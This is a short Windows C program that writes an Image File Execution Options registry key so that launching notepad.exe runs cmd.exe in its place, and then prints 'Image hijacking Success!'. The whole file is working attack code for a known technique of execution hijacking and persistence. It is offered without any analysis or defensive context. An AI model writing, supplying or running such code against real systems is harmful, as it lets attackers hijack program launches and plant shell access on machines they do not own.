#include <windows.h>
#include <stdio.h>

int main()
{
    char buffer[] = "cmd.exe";
    HKEY hKey;
    DWORD dwDisposition;
    LPCTSTR SetData = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_LOCAL_MACHINE,SetData,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition))
    {
        if (ERROR_SUCCESS == RegSetValueEx(hKey,"Debugger",NULL,REG_SZ,LPBYTE(buffer),sizeof(buffer)))
        {
            printf("Image hijacking Success!\n");
        }
    }
    RegCloseKey(hKey);
}
